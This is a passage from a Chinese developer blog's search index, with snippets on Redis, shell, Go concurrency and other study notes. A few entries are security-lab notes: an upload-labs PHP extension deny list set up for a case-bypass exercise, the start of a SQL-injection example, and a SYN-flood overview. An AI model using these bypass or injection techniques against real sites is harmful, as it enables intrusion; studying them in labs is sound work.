linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-03/"},{"content":"大小写绕过漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name","lvl0":"pass-06 【大小写绕过漏洞】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"8d51453dc713c25a01e387683dd73f43","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-06/"},{"content":"参考博客 十进制转二进制 1 2 3 PS D:\\ASUS\\Desktop\u0026gt; [System.Convert]::ToString(224,2) 11100000 N进制转十进制 1 2 PS D:\\ASUS\\Desktop\u0026gt; [System.Convert]::ToInt32(24,8) 20","lvl0":"powershell常用计算","lvl1":null,"lvl2":"摘要","objectID":"0a1b9535238f4de5e01e78a8b12ab0f9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/bat%E8%84%9A%E6%9C%AC/powershell%E5%B8%B8%E7%94%A8%E8%AE%A1%E7%AE%97/"},{"content":"python 脚本总结 python判题程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55","lvl0":"python实现判题程序","lvl1":null,"lvl2":"摘要","objectID":"46e15b87aafd339ac76a417dbfae58db","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E9%A1%B9%E7%9B%AE%E8%84%9A%E6%9C%AC/python%E5%AE%9E%E7%8E%B0%E5%88%A4%E9%A2%98%E7%A8%8B%E5%BA%8F/"},{"content":"几款 MQ 的性能对比 ActiveMQ: JMS 规范 (java 定义的规范)，支持事务，支持XA 协议（支持事务消息）， 没有生成大规模支撑场景，官方文档维护越来越少 RabbitMQ : erlang 语言开发，","lvl0":"rabbitMQ 、Kafka、ActiveMq 等","lvl1":["八股文"],"lvl2":"摘要","objectID":"828ef0cda28960450cb7c7a889795ef6","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mq/kafaka-activemqrabbitrocketmq/"},{"content":"","lvl0":"rabbitMQ 镜像队列","lvl1":["八股文"],"lvl2":"摘要","objectID":"fc1c4f7cb99626eac5214f2e28537ba2","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mq/rabbitmq-%E9%95%9C%E5%83%8F%E9%98%9F%E5%88%97/"},{"content":"react 代码配置笔记 next 安装 ant-design 过程 1 2 3 4 5 6 7 8 9 10 yarn add @zeit/next-css # 安装 可以在 react 上写 css的框架 yarn add antd # 安装 ant-design yarn add babel-plugin-import # 安装 babel 按需加载 1 2 3 4 5 6 7 8 9 10 11","lvl0":"react配置记录","lvl1":null,"lvl2":"摘要","objectID":"0a9547f2a248845a29230587462e51b1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E9%85%8D%E7%BD%AE/"},{"content":"以下为redis.conf的文件的中文描述，整理于网络 1 2 3 4 5 6 7 8 9 10 11 12 # Redis 配置文件示例 # 注意单位: 当需要配置内存大小时, 可能需要指定","lvl0":"redis conf 配置","lvl1":null,"lvl2":"摘要","objectID":"a375297cfcfdb800215f942e4fcd0508","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-conf-cn/"},{"content":"redis rdb 和 aof 机制 rdb: redis database 在指定时间内将内存中的数据集快照写入磁盘，实际操作过程就是一个 fork 一个子进程，先将数据写入临时文件，写入成功 后再替换之前的文","lvl0":"redis rdb 和 aof机制","lvl1":["八股文"],"lvl2":"摘要","objectID":"94f518490ac6e2ef5452528d83fb86eb","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/redis/redis_rdb_aof%E6%9C%BA%E5%88%B6/"},{"content":"1. Redis部署 以下以Linux系统为例 1.1 下载和编译 1 2 3 4 $ wget http://download.redis.io/releases/redis-4.0.7.tar.gz $ tar xzf redis-4.0.7.tar.gz $ cd redis-4.0.7 $ make 编译完成后会在src目录下生成Redis服务端程序red","lvl0":"redis部署过程","lvl1":null,"lvl2":"摘要","objectID":"4f2d8e177542ad7d01da7de86a5308dd","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-cluster/"},{"content":"1. redis是什么？（what） Redis是一个开源（BSD许可），内存存储的数据结构服务器，可用作数据库，高速缓存和消息队列代理。它支持字","lvl0":"redis介绍","lvl1":null,"lvl2":"摘要","objectID":"c1a407f096a746a4f5de722f250ab2bf","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-introduction/"},{"content":"本文来自redis 官方配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when","lvl0":"redis配置 英文版","lvl1":null,"lvl2":"摘要","objectID":"76227d70e5d76107db7f17ccc6c706a3","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-conf-en/"},{"content":"1. 部署Redis集群 redis的安装及配置参考[redis部署] 本文以创建一主二从的集群为例。 1.1 部署与配置 先创建sentinel目录，在该目","lvl0":"redis哨兵集群使用","lvl1":null,"lvl2":"摘要","objectID":"e202cb5fc7e97298ac197d3a97d3b30f","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-sentinel/"},{"content":"redis 为什么最大 512M redis中用int来修饰len字段，int为4个字节，也就是32位，那么最大能表示 $2^32$ 次方。所以2^32/8/1024/102","lvl0":"redis数据结构","lvl1":null,"lvl2":"摘要","objectID":"04d92150ce8516b36d4fefcc94918f61","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/redis%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"rwlock 这一类并发读写问题叫作  readers-writers 问题，意思就是，同时可能有多个读或者多个 写，但是只要有一个线程在执行写操作，其它的线程都不能执行读写操作。 RWMutex 的方","lvl0":"RWMutex","lvl1":null,"lvl2":"摘要","objectID":"6e7c62ab8982a343349f38df5bf36cbd","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/rwmutex/"},{"content":"wrap.c源码学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"select 、poll api学习","lvl1":null,"lvl2":"摘要","objectID":"0eebe62d755f46fce4d8dc035b07f7ad","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/select-api/"},{"content":"semaphore原理 信号量的概念是荷兰计算机科学家 Edsger Dijkstra 在 1963 年左右提出来的，广泛应用在 不同的操作系统中。在系统中，会给每一个进程一个信号量，","lvl0":"semaphore","lvl1":null,"lvl2":"摘要","objectID":"501a21b6574aac5f78ab4613f433c579","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/semaphore/"},{"content":"信号量的使用方法 我的共享资源有多个， 需要限制同时访问共享资源的线程上限","lvl0":"semaphore_信号量","lvl1":null,"lvl2":"摘要","objectID":"8be16d010a455665cd1934a574116497","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/semaphore_%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"content":"1. 字符串 字符串是shell编程中最常用最有用的数据类型（除了数字和字符串，也没啥其它类型好用了），字符串可以用单引号，也可以用双引号，也可以","lvl0":"shell-array","lvl1":null,"lvl2":"摘要","objectID":"0c68c6aafb8c80756303e95bfa3dcac1","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-array/"},{"content":"awk学习 awk语法 1 2 3 4 Usage: awk [POSIX or GNU style options] -f progfile [--] file ... awk \u0026#39;{ sum += $1 }; END { print sum }\u0026#39; file # 可以直接 man 1 awk 查看内容 1 2 awk \u0026#39;{print $1}\u0026#39; temp # 输出每一行的第一列单词,以","lvl0":"shell-awk","lvl1":null,"lvl2":"摘要","objectID":"f9d7709c1fd557f407396e70f90af651","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-awk/"},{"content":"shell备份学习 备份传输 ftp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash #Author:LYR #Time:2021-10-03 23:24:40 #Name:app.sh ftp -inv \u0026lt;\u0026lt;EOF open 192.44.11.6 user ftp_user user_pwd cd /tmp # 1.txt 上传到 对方 tmp 目录 put 1.txt byte # 退出 EOF man ftp 查看 目录","lvl0":"shell-backup","lvl1":null,"lvl2":"摘要","objectID":"a34b99a81c36086a8fdf19f0c62ac965","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-backup/"},{"content":"1. shell运算符 Bash 支持很多运算符，包括算数运算符、关系运算符、布尔运算符、字符串运算符和文件测试运算符。 awk 和 expr，expr 最常用 例如，","lvl0":"shell-char","lvl1":null,"lvl2":"摘要","objectID":"096f5f4f1749dd838e9b86ac4c2f9028","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-char/"},{"content":"1. echo echo是Shell的一个内部指令，用于在屏幕上打印出指定的字符串。命令格式： 1 echo arg 您可以使用echo实现更复杂的输出格式控制。 1.1. 显示转","lvl0":"shell-echo","lvl1":null,"lvl2":"摘要","objectID":"d54b6ed8559d57f9d303d121b5ebdb03","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-echo/"},{"content":"1. 函数定义 函数可以让我们将一个复杂功能划分成若干模块，让程序结构更加清晰，代码重复利用率更高。Shell 也支持函数。Shell 函数必须先定义","lvl0":"shell-function","lvl1":null,"lvl2":"摘要","objectID":"b8d3d296fb94d900e947c695b6300fd6","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-function/"},{"content":"grep熟悉和使用 grep 参数总结 参数选项 解释说明 -v 排除匹配结果 -n 显示匹配行与行号 -i 不区分大小写 -c 只统计匹配的行数 -E 扩展正则表达式 ,使用 egrep","lvl0":"shell-grep","lvl1":null,"lvl2":"摘要","objectID":"d54b0b8d32759411013d31a86f038076","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-grep/"},{"content":"1. if语句 if 语句通过关系运算符判断表达式的真假来决定执行哪个分支。Shell 有三种 if \u0026hellip; else 语句： if \u0026hellip; fi 语句； if \u0026hellip; else \u0026hellip; fi 语句； if \u0026hellip; elif \u0026hellip; else \u0026hellip; fi 语句","lvl0":"shell-if","lvl1":null,"lvl2":"摘要","objectID":"f49509727e6735ee1b853c63836f0615","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-if/"},{"content":"1. shell简介 shell是用户和Linux内核之间的一层代理，解释用户输入的命令，传递给内核。 shell是一种脚本语言（解释性语言）。 Sh","lvl0":"shell-introduct","lvl1":null,"lvl2":"摘要","objectID":"4307acd21e3147322ad1947a0dac200b","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-introduction/"},{"content":"1. for for循环一般格式为： 1 2 3 4 5 6 7 for 变量 in 列表 do command1 command2 ... commandN done 列表是一组值（数字、字符串等）组成的序列，每个值通过空格分隔。每循环一次，就","lvl0":"shell-loop","lvl1":null,"lvl2":"摘要","objectID":"b2af611a72ff7041c52c7a74c414fa39","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-loop/"},{"content":"sed编辑器学习 sed原理和过程 编辑器将文本内容读入内存，修改后再写回文件 学习教程 参数选项 参数选项 解释 -n 取消默认sed输出，经常与sed内置","lvl0":"shell-sed","lvl1":null,"lvl2":"摘要","objectID":"ec4690d38baaf4befc5a0f59707dc948","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-sed/"},{"content":"sort 升序 降序 -r reverse 反转 1 sort -n -r number.txt -o number.txt 1 2 3 4 5 6 7 8 9 10 [zookeeper@master rh]$ cat facebook.txt banana:30:5.5 apple:10:2.5 pear:90:2.3 orange:20:3.4 [zookeeper@master rh]$ sort -n -k 2 -t : facebook.txt apple:10:2.5 orange:20:3.4 banana:30:5.5 pear:90:2.3 这个文件有三列，列与列之间用冒号隔开了，第一列","lvl0":"shell-sort","lvl1":null,"lvl2":"摘要","objectID":"19bf2ef9fc6e91e3840dad3ee729c1f5","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-sort/"},{"content":"Unix 命令默认从标准输入设备(stdin)获取输入，将结果输出到标准输出设备(stdout)显示。一般情况下，标准输入设备就是键盘，标准输出设备","lvl0":"shell-stdout","lvl1":null,"lvl2":"摘要","objectID":"302786cbae5c5b762b56ed7a540b3534","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-stdout/"},{"content":"1. shell变量 Shell支持自定义变量。 1.1. 定义变量 定义变量时，变量名不加美元符号（$），如： 1 variableName=\u0026#34;value\u0026#34; 注意，变量名和等号之间不能有空格，这可能和","lvl0":"shell-var","lvl1":null,"lvl2":"摘要","objectID":"015ece4d9794f0052d60321120904768","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-var/"},{"content":"shell 函数调用 1 2 3 4 5 6 7 8 9 10 11 12 func() { name=yxc echo \u0026#34;Hello $name\u0026#34; return 123 } output=$(func) ret=$? echo \u0026#34;output = $output\u0026#34; echo \u0026#34;return = $ret\u0026#34; 输出结果： 1 2 output = Hello yxc return = 123 文件重定向原理 每个进程默认打开3个文件描","lvl0":"shell编程相关","lvl1":null,"lvl2":"摘要","objectID":"250257ba303d3c55822e858a9fe5106c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3/"},{"content":"shiro使用总结 口述： 自定义一个 realm 调用 login 方法，shiro 自动 去从 realm 里面获取用户信息， 然后 我这个 realm 注入 usermapper ，userMapper 或者 userService 获取 用户","lvl0":"shiro框架使用总结","lvl1":null,"lvl2":"摘要","objectID":"6a381052564da8f90607750b40200feb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/shiro%E6%A1%86%E6%9E%B6/"},{"content":"作者：牛客636793145号 链接：https://www.nowcoder.com/discuss/650653 来源：牛客网 spring事","lvl0":"spring事务隔离级别","lvl1":null,"lvl2":"摘要","objectID":"deed7c6ab50fe0451b010296974c58f1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/spring%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/"},{"content":"举个例子 1 2 3 4 select*fromtestwherename=\u0026#39;test\u0026#39;and\u0026#39;1\u0026#39;=\u0026#39;1\u0026#","lvl0":"sql注入漏洞","lvl1":null,"lvl2":"摘要","objectID":"20ae15b4db43122d6d98bcebf2f64e87","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9E%84%E5%BB%BA/"},{"content":"请你写一个函数 StrToInt，实现把字符串转换成整数这个功能。 当然，不能使用 atoi 或者其他类似的库函数。 样例 1 2 3 输入：\u0026#34;123\u0026#3","lvl0":"strTOint","lvl1":null,"lvl2":"摘要","objectID":"6f5d8e052180884dcd6817b8a30420b5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AD%97%E7%AC%A6%E4%B8%B2/strtoint/"},{"content":"golang 三色标记法 三色标记法为什么要 STW 强三色不变性 强制性 不允许黑色引用白色对象 【读写屏障，runtime复制判断】 弱三色不变性 黑色可以引用白色， 白","lvl0":"STW 和三色标记法","lvl1":null,"lvl2":"摘要","objectID":"2753b31ed3898990f36ddfc5482e2ac6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/golang%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/stw-%E5%92%8C%E4%B8%89%E8%89%B2%E6%A0%87%E8%AE%B0%E6%B3%95/"},{"content":"几种泛洪攻击原理 syn泛洪攻击 ack泛洪攻击 http泛洪攻击 slowloris 攻击 查看 系统 tcp连接状态 1 netstat -an | grep tcp syn泛洪的原理 客户端疯狂发送 syn 和服务器","lvl0":"SYN 泛洪攻击","lvl1":null,"lvl2":"摘要","objectID":"c988cd010ac65ca8ba3f9a4a6be49b13","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/syn-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/"},{"content":"pool 的使用方法 像数据库连接、TCP 的长连接，这些连接在创建的时候是一个非常耗时的操 作。如果每次都创建一个新的连接对象，耗时较长，很可能整个业务","lvl0":"sync.Pool","lvl1":null,"lvl2":"摘要","objectID":"5826aca6aad024fffccd8142a8bdec08","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/sync.pool/"},{"content":"学习视频参考 偏向锁撤销情景 调用 hashCode 调用waitNotify 多线程访问【升级为轻量级锁，要先撤销偏向锁】 锁消除和锁粗化 消除的 